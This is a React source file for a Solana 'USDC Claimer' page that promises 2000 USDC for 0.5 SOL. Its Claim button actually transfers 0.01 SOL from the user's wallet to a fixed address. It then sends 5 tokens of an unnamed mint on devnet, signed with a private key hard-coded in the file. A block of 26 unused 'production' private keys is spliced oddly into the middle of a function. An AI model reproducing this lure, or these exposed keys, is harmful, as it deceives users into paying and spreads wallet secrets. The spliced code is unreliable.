/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "S1s88K8AN3J2Nz8o6SESUrQrV6mPmQa86znzYFxfecde5tpk7DXcLtfArHEMsBYTiV63vidBhg9oDd2gFu5yxbt"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "Wv9weq2yu1U9wqeMSCn1j8sHd6ouhzMHZ7EPA9eyXXRSBYMEd76cyen6cydC227mRMEP7Ljp7pA19U4CJ5QbxH6",
  "key1": "3vTHFfkeKLQ7pT4MjvSFAKJuV7NWGocz3S2Q9dhEtyam7qSgYRjF3gqq6fsthsLeeDN2r9Riv3m83h94zrg1GKDU",
  "key2": "jLrqkYJn3sSQMeGKonAFaxYcxJ572QZeDCujd61rmLTLQWmzS1w6aVweSfYvz5N7mTVmEsSExiiRALRCzifeBBx",
  "key3": "pYui56nR38srJn3GsLReTaBKnUFaaJJNy47uNLYz8AovcwVHw63vmL6FUKzWpKnhTctNtd4wHyJcgnVV12VPUPA",
  "key4": "5MD6HcTqiwT5gYrx5n29PxmQPgzd45o6PrskrHFZutTbfKKYUZCk6MJbXuYiVMHhtjgNDAquS9qkqScMELPQvr1X",
  "key5": "3F1KvAu414t3yW4cm9ypPj11MFWFDzE9aPHzxYyshSxKUewKiiB2wuaXDy8w81L5eP2ccRjoUH4MEyAhV6B3TrEB",
  "key6": "2sSENCNyayyZWVh2YrbpVEdRMoz4HQjano91mDkhy6ktfZseNtUQbBkxNPxNJHvjLGq5PmPDBJkDw4FdDJDkgAdP",
  "key7": "3hnVBr1LC2ffojotnDLspZdEaftZ9nRy2ffCxHEt4bEtwApJw31J5WPquKdboJvDJpRddE67gVaxfCboP5SqfALh",
  "key8": "2riJvCVNy1Frx7jq1TwzeR5sZ8VGTAeQwot5YSJ9FDmAhmCVtcKgr5qQnJ4BCsSfXY3Y6kAGSBxDcGtfFe2gDYEz",
  "key9": "4DitaLkrpis3SgQveky24eEfwhWiUtMy4g2US9Rm9WwWFxpyEMNDqKH5JoUZEzVxVf79nwCgJm6CEKhmjT4e9Ph9",
  "key10": "5vkGtBa62ecSkMkviBMgzHsrQ9CMcTiRdfiMUXv4cyFBwiCCLhCMQwpB5RFndouZMtFpddRcXj5gX5bUbKhUjevp",
  "key11": "3qaJbtLP8F9tKgWnCTJLhV42bXTFqRQG9kuViYrUQdvuG2VXZSxaHgkZDx9zHotGzz1B6Z8SkpJ7WPFbpAd542e5",
  "key12": "2yuWbqxbx2d6FCKrtQZZhMCwBnh5MiGGe4qHq64epR8speRfE74jy6tMVunQAqgAoDJ7VHNuh9w8NPJLHVrf48jU",
  "key13": "5TobV15UvNhSFuain5R5Egy7GTKEuKZYN25YuBMCChnqWetZM2MnRtsQyjvcVqV7ncoC8gTbqH5za2xAfTPYHSyW",
  "key14": "2xgLo12ifecdaappcBokDnBvYPwrnJ84DKEhquQuBc47FMvitRmGTZqPzUTiFFC4HKNDdqhQM4gubTEK9L5gVZ18",
  "key15": "2BAfsgnLSoup4msS84yovro4XBLR8T38eJHFHoGc6ZQkJQBPR66tpzzszzNqn2jU6nDhe8diynghq1BSV3UgpkYK",
  "key16": "QHuXSD5x5DxvADmsfToLEPXjXD2BY8H1AYgG2bWQ5LKNHx1YfAjVNq5aBiUuCWjm2DMWpCiQVy4EBLBr1DRVENg",
  "key17": "3YzUW5tjHSGS91yBf2JHPbxsYbjVbU1dido6bdFCsUWxkreJ3Swnowyosfp6QVd78ToE6BnJRpnaL2AagKjfPPMQ",
  "key18": "5MoHG1S6gufPDmgwRF7cf6eMPCC4ShCV7uvTXdeMbTmRbN52TiDEVkNLNyJdLLnSGwRJZ3nWWkDumPkAkLAc8BiD",
  "key19": "2rwLGWhgTWgbshggBPDAVJ6raZrs7erJpvi7wZegN3rTojKXLJyq6vTjStcu4EM9nStiu1x37KKKYSpqDJRtyqur",
  "key20": "3nhN9wk1gqU4rEkjbKdTA2R1dAGZGRT4FWJv9pboL6hh2fZCwYL59VJCUZquQFmgVgKvYxX8jmyXfSi5SfxbkQtf",
  "key21": "421Qhm8WeaFgVpzZ2FJRwPd3V71fynv5HRsRmoHK116JrRMqhjx4Xh789jfjSK7GQxXy23vDeRPyVn933AwDr9ec",
  "key22": "3LHUrt2DB7hu4UoE1yHEJtFo3vCbDkgEz8rwh1UFLFZq4hwx2mXUaG4rVqAasK5UPfqThGqHdCvaKZYELz1MW6We",
  "key23": "3LxsZxh77MzbEwSFCbQzejwTp3TZDe1YjgZ17Dfsw1t6mJKMwRffo9rCpqmhtKJ3Go46U7hY4AzXuPVQC85GBSTz",
  "key24": "2YXjDZPeFKwvLkDErLHcFndacahNuoMDYFDRCYBW2Qkg859WABvaEaWutpAzCYz5frh8wU8fJwq2NXTZbshMDwiM",
  "key25": "4q5c4TJ3VNWc1ArMTFLt26cquG25zE8mtqHophPRXQWh6MUPGKiEtZPwvPkNNzteinaujbMQzGof4hujWMr6v8jy"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
